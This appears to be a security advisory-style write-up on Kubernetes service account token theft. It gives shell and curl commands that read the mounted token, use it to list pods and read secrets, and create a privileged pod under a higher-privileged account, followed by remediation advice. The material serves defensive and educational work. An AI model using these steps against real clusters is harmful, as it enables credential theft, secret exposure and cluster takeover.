
# Kubernetes Service Account Token Theft and Lateral Movement

## 1. Overview Section

### Attack Vector Description

This vulnerability allows an attacker to gain unauthorized access to a Kubernetes cluster by stealing a service account token and using it to impersonate the service account. This compromised identity can then be leveraged for lateral movement, potentially granting access to sensitive data, privileged operations, and even the entire cluster. An attacker with access to a pod (either through code injection, command injection, or other means) can often access the service account token mounted within the pod's filesystem.

### Potential Impact and Consequences

*   **Data Exfiltration:** Access to sensitive data stored within the cluster or external resources.
*   **Privilege Escalation:** Compromise of higher-privileged service accounts, leading to cluster administrator access.
*   **Denial of Service:** Disruption of services by manipulating or deleting critical resources.
*   **Cluster Takeover:** Complete control over the Kubernetes cluster.
*   **Resource Hijacking:** Use of cluster resources for malicious purposes, such as cryptocurrency mining.

### Risk Level Assessment

**Critical** - Due to the potential for complete cluster compromise and sensitive data exposure.  The availability of service account tokens within pods by default significantly increases the likelihood of exploitation.

### Technical Explanation

Kubernetes automatically creates and mounts service account tokens within pods for authentication and authorization purposes. These tokens are stored in the pod's filesystem at `/var/run/secrets/kubernetes.io/serviceaccount/token`.  The default configuration allows any process running within the pod to access these tokens.  If a pod is compromised, the attacker can steal the token and use it to authenticate as the service account. Role-Based Access Control (RBAC) defines the permissions associated with the service account. If the service account has excessive permissions, the attacker can perform actions beyond the intended scope.

### Prerequisites and Conditions Needed

1.  **Compromised Pod:** An attacker needs to gain access to a pod within the Kubernetes cluster. This can be achieved through vulnerabilities such as:
    *   Code injection
    *   Command injection
    *   Exploiting application vulnerabilities.
    *   Misconfigured network policies allowing unwanted access to pods
2.  **Service Account Token:**  A service account token must be mounted within the compromised pod. This is the default behavior for Kubernetes.
3.  **Sufficient Service Account Permissions:** The compromised service account must have sufficient permissions to perform actions of interest (e.g., reading secrets, creating pods, etc.).

## 2. Validation and Exploitation Steps Section

**Phase 1: Token Extraction and Verification**

1.  **Gain Access to a Pod:** Assume the attacker has already gained access to a pod, either through a vulnerability or misconfiguration. Let's assume we have a shell inside a pod called `vulnerable-pod` in the `default` namespace.

    ```bash
    kubectl exec -it vulnerable-pod -n default -- /bin/bash
    ```

    **Explanation:** This command uses `kubectl` to execute a bash shell inside the `vulnerable-pod`.  The `-it` flags allocate a pseudo-TTY and keep stdin open. The `-n default` specifies the namespace the pod is in.
    **Expected Output:** A shell prompt inside the `vulnerable-pod`.
    **Contribution:** This step provides the initial access point needed to exploit the vulnerability.

2.  **Locate and Retrieve the Service Account Token:**

    ```bash
    TOKEN_PATH=/var/run/secrets/kubernetes.io/serviceaccount/token
    TOKEN=$(cat $TOKEN_PATH)
    echo "Token: $TOKEN"
    ```

    **Explanation:** This script defines the path to the service account token file, reads the token's contents, and prints the token to the console.
    **Expected Output:** The service account token will be printed to the console. This is a long string of characters. If the path does not exist, the service account is not mounted, and the vulnerability cannot be exploited via this method.
    **Contribution:** This retrieves the sensitive service account token, which will be used for authentication in subsequent steps.

3.  **Get the Kubernetes API Server Address:**

    ```bash
    API_SERVER=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}')
    echo "API Server: $API_SERVER"
    ```

    **Explanation:** This command retrieves the Kubernetes API server address from the kubectl configuration. This is necessary to interact with the API using the stolen token.
    **Expected Output:** The URL of the Kubernetes API server (e.g., `https://192.168.64.3:6443`).
    **Contribution:**  Knowing the API server address is crucial for making authenticated requests.
    **Alternative Approach:** The API server address can also be hardcoded or determined through other means if `kubectl` is not available within the pod.

4.  **Test Authentication Using the Stolen Token:**

    ```bash
    NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
    curl -k -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" $API_SERVER/api/v1/namespaces/$NAMESPACE
    ```

    **Explanation:** This command uses `curl` to make an API request to the Kubernetes API server.  The `-k` flag skips SSL certificate verification (useful in some environments, but not recommended for production).  The `Authorization` header includes the stolen service account token. The API request attempts to retrieve information about the current namespace that the pod is running in.
    **Expected Output:** If the token is valid and the service account has sufficient permissions to view the namespace details, you'll receive a JSON response containing information about the namespace.  If you receive a `401 Unauthorized` error, the token is invalid or the service account lacks the necessary permissions. If you receive a `403 Forbidden` error, the service account lacks permissions to the requested resource.
    **Contribution:** This step confirms that the token is valid and allows you to assess the initial level of access granted to the service account. A 403 error here doesn't necessarily mean the vulnerability is not exploitable, only that this particular resource requires more permissions than the stolen service account currently has.  Further exploration is needed to identify exploitable permissions.

**Phase 2: Lateral Movement and Privilege Escalation (Example: Accessing Secrets)**

5.  **Enumerate Permissions (If Not Already Known):** While this step isn't always necessary, it is useful to enumerate the resources the service account has access to. This can be done by attempting to access various resources and observing the response. We'll start by attempting to list all pods in the cluster.

    ```bash
    curl -k -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" $API_SERVER/api/v1/pods --get --data-urlencode 'limit=500'
    ```

   **Explanation:** Attempts to list all pods in the cluster.
   **Expected Output:** A long JSON output if the token is valid and the service account has enough permissions to list pods.  A 403 error would mean not enough permissions.

6.  **Attempt to Read Secrets:**  Now, let's assume the service account has read access to secrets in the `default` namespace. We'll attempt to read a specific secret named `my-secret`.

    ```bash
    SECRET_NAME="my-secret" # Replace with an existing secret name
    curl -k -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" "$API_SERVER/api/v1/namespaces/$NAMESPACE/secrets/$SECRET_NAME"
    ```

    **Explanation:** This command uses `curl` to retrieve the secret named `my-secret` from the `default` namespace.
    **Expected Output:**  If the service account has read access to the secret, the command will return a JSON response containing the secret data. If you receive a 403 error, the service account lacks the necessary permissions.  If `my-secret` doesn't exist, a 404 error is expected.
    **Contribution:** This demonstrates how the stolen token can be used to access sensitive data stored in Kubernetes secrets. If the secret contains credentials or other sensitive information, it can be used to further compromise the cluster or external systems.

7.  **Create a Pod with Increased Privileges (If Allowed):**  If the service account has permissions to create pods, an attacker might attempt to create a new pod with a higher-privileged service account or with hostNetwork/hostPath access, further escalating their privileges.

    ```bash
    POD_DEFINITION='{
      "apiVersion": "v1",
      "kind": "Pod",
      "metadata": {
        "name": "privileged-pod"
      },
      "spec": {
        "serviceAccountName": "admin-service-account",
        "containers": [
          {
            "name": "shell",
            "image": "busybox:latest",
            "securityContext": {
                "privileged": true
            },
            "command": ["/bin/sh", "-c", "while true; do sleep 3600; done"]
          }
        ]
      }
    }'

    curl -k -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -X POST -d "$POD_DEFINITION" $API_SERVER/api/v1/namespaces/$NAMESPACE/pods
    ```

    **Explanation:** This attempts to create a new pod named `privileged-pod` using the stolen service account credentials. `serviceAccountName` is set to `admin-service-account` (assuming that service account exists and provides greater cluster access).  The `securityContext` sets `privileged: true`, which attempts to run the container in privileged mode (effectively disabling many security features).
    **Expected Output:** If the service account has permission to create pods and the requested service account and security context settings are allowed, the command will return a JSON response indicating that the pod creation was successful. If access is denied, a 403 Forbidden error will be returned. The "admin-service-account" needs to already exist. This assumes that a higher-privileged service account can be abused.
    **Contribution:** Success here signifies a major escalation. The compromised service account now controls a pod with significant privileges, potentially leading to full cluster control.  An attacker can then pivot from this privileged pod to access other resources or perform malicious actions.

**Remediation Recommendations**

*   **Least Privilege Principle:**  Grant service accounts only the minimum permissions necessary to perform their intended functions.  Avoid using cluster-admin service accounts for general-purpose applications.
*   **Network Policies:** Implement network policies to restrict network traffic between pods and namespaces. This prevents lateral movement by limiting the ability of compromised pods to communicate with other parts of the cluster.
*   **Pod Security Policies (Deprecated, use Pod Security Admission):**  Use Pod Security Policies (or the newer Pod Security Admission) to restrict the security context of pods, preventing them from running in privileged mode or accessing host resources.
*   **Audit Logging:** Enable audit logging to track API requests and identify suspicious activity.  Regularly review audit logs to detect and respond to potential security incidents.
*   **Rotate Service Account Tokens:**  Implement a process for regularly rotating service account tokens. This limits the window of opportunity for attackers who have stolen a token.  Consider using projected service account tokens with an expiration time, preventing long-lived tokens.
*   **Principle of Least Functionality:** Ensure that applications only contain the functionality required and remove unnecessary tools and features. This reduces the attack surface and the potential for exploitation.
*   **Monitoring and Alerting:** Implement monitoring and alerting systems to detect anomalous behavior, such as unusual API requests or unauthorized access attempts.
*   **Secure Pod Access:** Harden access to pods through authentication and authorization mechanisms. Prevent unauthorized access to pods' shells or APIs.
*   **Consider mTLS:** Implement Mutual TLS between pods.
